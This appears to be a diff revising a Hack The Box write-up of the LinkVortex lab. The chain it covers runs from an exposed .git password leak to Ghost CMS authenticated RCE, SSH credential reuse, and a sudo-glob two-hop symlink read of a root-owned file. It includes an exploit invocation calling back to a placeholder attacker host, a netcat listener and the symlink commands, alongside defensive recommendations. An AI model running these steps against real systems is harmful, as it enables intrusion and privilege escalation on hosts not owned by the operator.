@@ -1,6 +1,6 @@
 ---
-title: "Linux Lab — Exposed Git, CMS RCE, and Symlink Protection Bypass"
-description: "An exposed .git directory on a development virtual host reveals a CMS password for authenticated RCE; a sudo cleanup script with a user-controlled glob and a two-hop symlink chain bypass kernel symlink protection to read a protected file."
+title: "LinkVortex — Exposed Git History to Ghost CMS RCE and a Symlink-Protection Bypass"
+description: "An exposed .git directory on a development virtual host reveals a CMS password for authenticated RCE; a sudo cleanup script with a user-controlled glob and a two-hop symlink chain reads a protected file."
 type: case-study
 platform: Hack The Box
 content_type: machine
@@ -12,23 +12,49 @@ tags:
   - ghost-cms
   - symlink
   - sudo
+objective: "Escalate from an exposed Git repository on a development virtual host to root-owned file read via Ghost CMS code execution and a privileged cleanup script."
+tools:
+  - rustscan
+  - nmap
+  - gobuster
+  - feroxbuster
+  - git
+  - git-dumper
+  - sshpass
+  - netcat
+skill: "Web enumeration and Linux privilege escalation"
+outcome: "Authenticated Ghost CMS remote code execution as the application user, followed by a root-owned file read through a sudo glob and a two-hop symlink chain"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Ubuntu 22.04 Linux host running Apache and Ghost CMS 5.58.0 |
+| Starting position | Unauthenticated network access |
+| Objective | Escalate from an exposed Git repository on a development virtual host to root-owned file read |
+| Outcome | Ghost CMS authenticated RCE as the application user; root-owned file read via a sudo glob and symlink chain |
 
 ## Summary
 
-This Linux lab uses virtual-host enumeration to uncover an exposed `.git` directory on a development subdomain. Git history reveals a CMS password change, granting authenticated access and remote code execution. Privilege escalation abuses a sudo rule that passes a user-controlled glob to a cleanup script, using a two-hop symlink chain to bypass kernel symlink protection and access a protected file.
+LinkVortex is an Easy-rated Hack The Box Linux lab. Virtual-host enumeration exposes a development subdomain whose web root publishes a `.git` directory; the repository's staged changes reveal a Ghost CMS password that authenticates to the admin panel. That access enables an authenticated remote code execution flaw in Ghost (CVE-2026-29053), yielding a shell as the application user, whose database password is reused for SSH. Privilege escalation abuses a sudo rule that passes a user-controlled `*.png` glob to a cleanup script, and a two-hop symlink chain reads a root-owned file despite `fs.protected_symlinks=1`. Target and operator addresses, credentials, and file paths are replaced with role-based placeholders; command syntax is preserved.
 
-All target and operator addresses below use role-based placeholders (`<TARGET_IP>`, `<ATTACKER_IP>`). No real credentials, flags, or private paths are included.
+**Attack path:** **Exposed `.git` → Git-diff credential disclosure → Ghost CMS admin authentication → CVE-2026-29053 authenticated RCE → database-credential reuse → SSH access → sudo glob + two-hop symlink chain → root-owned file read**
 
 ## Context and Objective
 
-The engagement targets a single Linux host running Apache with virtual hosting and Ghost CMS. The objective is to obtain initial access through discovered credentials, escalate to user-level access, and ultimately read the root flag by bypassing `fs.protected_symlinks` protection.
+- **Target:** a single Ubuntu 22.04 Linux host running Apache with name-based virtual hosting and a Ghost CMS 5.58.0 instance.
+- **Exposed services:** SSH (22) and HTTP (80).
+- **Starting position:** unauthenticated network access; the initial HTTP response points to the base virtual host.
+- **Objective:** recover credentials from an exposed repository, obtain access through Ghost, move to the system account, and read a root-owned file through a privileged cleanup script.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Port Scanning
+### 1. Service Enumeration
 
-Initial reconnaissance identifies open SSH and HTTP services:
+Observation: an initial port scan exposes two services.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-tcp
@@ -39,11 +65,13 @@ rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-tcp
 80/tcp open  http    Apache httpd
 ```
 
-The web server redirects to `<TARGET_HOSTNAME>`.
+Significance: SSH needs credentials that are not yet available, so HTTP becomes the primary enumeration surface; the web service redirects, indicating name-based virtual hosting.
 
-### Virtual Host Enumeration
+Result: SSH and HTTP are reachable on the target.
 
-Gobuster vhost enumeration on the base domain reveals a development subdomain:
+### 2. Virtual Host Enumeration
+
+Observation: the web server redirects to `<TARGET_HOSTNAME>`, so additional hostnames may be served by the same listener.
 
 ```bash
 gobuster vhost \
@@ -56,9 +84,13 @@ gobuster vhost \
 <DEVELOPMENT_HOSTNAME>  Status: 200
 ```
 
-### Git Repository Exposure
+Significance: a development virtual host is served alongside the main site, widening the surface to an environment that typically holds unreleased code and deployment artifacts.
 
-Directory enumeration on the development virtual host exposes an unprotected `.git` directory:
+Result: `<DEVELOPMENT_HOSTNAME>` is identified as a valid virtual host.
+
+### 3. Exposed Git Repository
+
+Observation: content discovery against the development host is likely to surface deployed source-control metadata.
 
 ```bash
 feroxbuster --url http://<DEVELOPMENT_HOSTNAME> --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
@@ -68,7 +100,26 @@ feroxbuster --url http://<DEVELOPMENT_HOSTNAME> --wordlist /usr/share/seclists/D
 http://<DEVELOPMENT_HOSTNAME>/.git
 ```
 
-The repository is downloaded using `git-dumper` and inspected for staged changes. The diff reveals a modified authentication test file containing a password update:
+Action: retrieve and inspect the repository.
+
+```bash
+git-dumper http://<DEVELOPMENT_HOSTNAME>/.git git-dump
+cd git-dump
+git status
+```
+
+```text
+Changes to be committed:
+  new file:   Dockerfile.ghost
+  modified:   ghost/core/test/regression/api/admin/authentication.test.js
+```
+
+Restore the staged changes and diff them:
+
+```bash
+git restore --staged .
+git diff
+```
 
 ```diff
 -it('complete setup', async function () {
@@ -77,54 +128,65 @@ The repository is downloaded using `git-dumper` and inspected for staged changes
 +    const password = '<GHOST_ADMIN_PASSWORD>';
 ```
 
-The source notes report this password grants access to the Ghost CMS admin panel.
+Significance: the staged index retained a password change that the deployed files no longer showed, so the published `.git` directory disclosed the current credential without exploitation.
 
-### Ghost CMS Authenticated RCE (CVE-2026-29053)
+Result: `git-dumper` recovered the repository, and the diff disclosed the CMS password.
 
-The main site runs Ghost CMS version 5.58.0. The discovered password authenticates to the admin panel. Ghost 5.58.0 is vulnerable to CVE-2026-29053, an authenticated remote code execution flaw triggered by uploading a malicious theme and creating a page with a specific slug.
+### 4. Ghost CMS Authenticated RCE (CVE-2026-29053)
+
+Observation: the main site runs Ghost CMS 5.58.0, and the recovered password authenticates to the admin panel. Ghost 0.7.2 through 6.19.0 is affected by CVE-2026-29053, an authenticated remote code execution flaw in theme handling fixed in 6.19.1.
+
+Action: run the proof-of-concept against the admin instance and catch the callback.
 
 ```bash
-python3 exploit.py -i <ATTACKER_IP> -p <PORT>
+python3 exploit.py -i <ATTACKER_IP> -p <LISTENER_PORT>
+```
+
+```bash
 nc -lvnp <LISTENER_PORT>
 ```
 
-The exploit uploads the generated theme through the admin panel and triggers execution by visiting the crafted page endpoint, returning a reverse shell.
+The proof-of-concept uploads a crafted theme through the admin panel and triggers execution through a crafted page request.
 
-### Reverse Shell and Credential Harvesting
+Significance: authenticated administrator access is sufficient to reach server-side code execution, with no further system misconfiguration required.
 
-The reverse shell provides access as the Ghost application user. The Ghost configuration file contains database credentials:
+Result: a reverse shell executes as the Ghost application user.
+
+### 5. Reverse Shell and Credential Harvesting
+
+Observation: the shell runs as the Ghost application user, whose configuration file stores database credentials.
 
 ```json
 {
-  "user": "<DB_USER>",
+  "user": "<SERVICE_USER>",
   "pass": "<DB_PASSWORD>"
 }
 ```
 
-These credentials also authenticate via SSH as `<LOW_PRIVILEGE_USER>`. The source notes confirm the application and SSH passwords are identical.
+The same password also authenticated over SSH as `<SERVICE_USER>`; the source confirms the application and system passwords are one value.
 
 ```bash
-sshpass -p '<DB_PASSWORD>' ssh <LOW_PRIVILEGE_USER>@<TARGET_IP>
+sshpass -p '<DB_PASSWORD>' ssh <SERVICE_USER>@<TARGET_IP>
 ```
 
-User flag located at `<USER_FLAG_PATH>`.
+Significance: reusing one secret across the application configuration and the operating-system account turns a CMS compromise into a system login.
 
-### Privilege Escalation — Symlink Protection Bypass
+Result: a user-level SSH session is obtained with the recovered credentials.
 
-The `<LOW_PRIVILEGE_USER>` account has a sudo rule allowing execution of a cleanup script:
+### 6. Privilege Escalation — Sudo Glob and Symlink Bypass
+
+Observation: the account holds a sudo rule that runs a cleanup script with a caller-supplied glob.
 
 ```bash
 sudo -l
 ```
 
 ```text
-User <LOW_PRIVILEGE_USER> may run the following commands on <TARGET_HOSTNAME>:
+User <SERVICE_USER> may run the following commands on <TARGET_HOSTNAME>:
     (ALL) NOPASSWD: /usr/bin/bash <CLEANUP_SCRIPT> *.png
 ```
 
-The script accepts a glob argument for PNG files. The `*.png` glob is expanded by the shell before being passed to the script, making it user-controlled.
-
-The system has kernel-level symlink protection enabled:
+The `*.png` glob expands in the shell before the script runs, so the caller controls which paths the privileged script receives. The host also enforces kernel symlink protection:
 
 ```bash
 sysctl fs.protected_symlinks
@@ -134,16 +196,11 @@ sysctl fs.protected_symlinks
 fs.protected_symlinks = 1
 ```
 
-With `fs.protected_symlinks=1`, the kernel prevents `open()` from following symlinks in world-writable directories when the symlink owner differs from the follower. A two-step symlink chain bypasses this: create an intermediate symlink pointing at the target file, then create a PNG-named symlink pointing at the intermediate link. The kernel check only inspects the immediate symlink target, not the full chain.
+Significance: the host enables `fs.protected_symlinks=1`, yet the read still succeeds. The sudo rule runs a privileged cleanup script and accepts a user-controlled `*.png` glob, so the caller controls the path the script is pointed at. A two-hop chain — an intermediate symlink to the protected file, then a `.png`-named symlink to that intermediate link — is passed to the script, which returns the protected file's contents.
 
 ```bash
 ln -s <PROTECTED_FILE_PATH> <USER_CACHE>/b
 ln -s <USER_CACHE>/b <USER_CACHE>/a.png
-```
-
-Verify the chain:
-
-```bash
 ls -l <USER_CACHE>/a.png
 ```
 
@@ -151,32 +208,43 @@ ls -l <USER_CACHE>/a.png
 lrwxrwxrwx 1 <USER> <GROUP> <LENGTH> <USER_CACHE>/a.png -> <USER_CACHE>/b
 ```
 
-Execute the privileged script to trigger the file content read:
+Run the privileged script through the primed path:
 
 ```bash
-<CONTENT_CHECK_OPTION>=true sudo bash <CLEANUP_SCRIPT> <USER_CACHE>/a.png
+CHECK_CONTENT=true sudo bash <CLEANUP_SCRIPT> <USER_CACHE>/a.png
 ```
 
-The script outputs the contents of the root flag through the symlink chain.
+Result: the script returns the contents of the root-owned file through its own resolution of the symlink chain.
 
 ## Challenges and Decisions
 
-- The Ghost CMS password was found in a Git diff rather than an obvious config file, requiring careful staging-area inspection.
-- `fs.protected_symlinks=1` blocks direct symlinks from world-writable directories; the two-hop indirection bypasses the check because the immediate target of the `.png` symlink is in the same directory and owned by the same user.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| The password change sat in the staged Git index rather than a configuration file | Unstaged and diffed the repository | Staged changes retained a credential the deployed files no longer showed |
+| `fs.protected_symlinks=1` is enabled on the host | Created a two-hop symlink chain | The rule passes a caller-controlled `*.png` path to a privileged cleanup script, which returns the protected file's contents despite the symlink-protection setting |
 
 ## Outcome
 
-Full compromise achieved: initial access via Ghost CMS credentials extracted from exposed Git history, authenticated RCE through CVE-2026-29053, lateral movement to SSH using reused credentials, and root flag extraction through a symlink chain bypassing kernel protection.
+Authenticated Ghost CMS code execution yielded a shell as the application user; the reused configuration password provided a system-level SSH session, and a sudo rule accepting a user-controlled glob plus a two-hop symlink chain granted a read of a root-owned file. The admin login, reverse shell, and SSH session are recorded in the source as documented results without captured console output.
 
 ## Lessons and Recommendations
 
-- Exposed `.git` directories on development hosts are high-value enumeration targets. Git history reveals credentials even after they are removed from tracked files.
-- Application credentials often mirror system user passwords. Ghost CMS database credentials in configuration files double as SSH credentials.
-- `fs.protected_symlinks=1` is not complete protection. A two-hop symlink chain defeats it because the kernel check only inspects the immediate symlink target, not the resolved chain.
-- Sudo rules combining user-controlled globs with privileged file operations are inherently dangerous. The `*.png` argument expands in the shell before `sudo` processes it.
+The actions below are preventative recommendations; none was validated in the lab.
+
+1. **Exposed `.git` on a deployed web root.** The development virtual host served `.git`, exposing repository history and staged changes that held a live password change. *Impact:* an unauthenticated party recovered the CMS administrator credential. *Recommendation:* deploy web roots without any version-control metadata and keep development hosts off public DNS. *Detection:* alert on requests for `/.git/` and rotate secrets that ever passed through a published repository.
+2. **Credential reuse across application and system accounts.** The Ghost database password also authenticated the corresponding operating-system account. *Impact:* CMS code execution became a direct system login. *Recommendation:* issue unique credentials per service and account and never reuse an application secret as a system password. *Detection:* alert on interactive SSH logins that use application service accounts.
+3. **Authenticated RCE in an unpatched CMS.** Ghost CMS 5.58.0 falls inside the affected range for CVE-2026-29053. *Impact:* an authenticated administrator could execute code on the host. *Recommendation:* track Ghost releases and apply the 6.19.1 fix or later, restrict who holds admin access, and monitor theme uploads.
+4. **Privileged scripts with user-controlled globs.** The sudo rule passed a caller-supplied `*.png` glob into a root-run script that resolved a two-hop symlink chain to a root-owned file. *Impact:* a root-owned file was read. *Recommendation:* never pass user-controlled globs or paths into privileged scripts, bind fixed paths, and validate all inputs; keep `fs.protected_symlinks=1` as defense in depth while treating it as incomplete protection.
 
 ## References
 
-- HTB machine: retired Linux lab — [LinkVortex](https://app.hackthebox.com/machines/LinkVortex)
-- Ghost CMS: CVE-2026-29053 authenticated RCE
-- Linux kernel: `fs.protected_symlinks` sysctl documentation
+- [Hack The Box — LinkVortex](https://app.hackthebox.com/machines/LinkVortex) (retired machine)
+- [NVD — CVE-2026-29053](https://nvd.nist.gov/vuln/detail/CVE-2026-29053) (Ghost theme-handling remote code execution)
+- [GitHub Advisory — GHSA-cgc2-rcrh-qr5x](https://github.com/TryGhost/Ghost/security/advisories/GHSA-cgc2-rcrh-qr5x) (Ghost vendor advisory, fixed in 6.19.1)
+- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [Gobuster](https://github.com/OJ/gobuster) (virtual-host and content discovery)
+- [feroxbuster](https://github.com/epi052/feroxbuster) (recursive content discovery)
+- [git-dumper](https://github.com/arthaud/git-dumper) (exposed-repository recovery)
+- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
+- [Linux kernel — `fs` sysctl documentation](https://docs.kernel.org/admin-guide/sysctl/fs.html) (`fs.protected_symlinks`)
